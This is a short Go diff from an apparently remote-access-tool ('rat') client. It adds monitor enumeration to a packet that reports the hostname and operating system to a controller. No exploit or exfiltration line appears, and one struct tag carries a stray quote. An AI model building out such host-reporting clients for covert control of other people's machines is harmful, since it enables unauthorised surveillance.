@@ -3,6 +3,8 @@ package main
 import (
 	"oslib"
 	"rat/client/computer"
+	"rat/client/screen"
+	"rat/shared"
 	"rat/shared/network/header"
 )
 
@@ -11,6 +13,7 @@ type ComputerInfoPacket struct {
 	Hostname                   string
 	OperatingSystemName        string `operatingSystemName"`
 	OperatingSystemDisplayName string `operatingSystemDisplayName`
+	Monitors                   []shared.Monitor
 }
 
 func (packet ComputerInfoPacket) Header() header.PacketHeader {
@@ -24,4 +27,7 @@ func (packet *ComputerInfoPacket) Init() {
 	packet.Hostname = u.Hostname
 	packet.OperatingSystemName = oslib.Name
 	packet.OperatingSystemDisplayName = oslib.GetDisplay()
+
+	screen.QueryMonitors()
+	packet.Monitors = screen.Monitors
 }
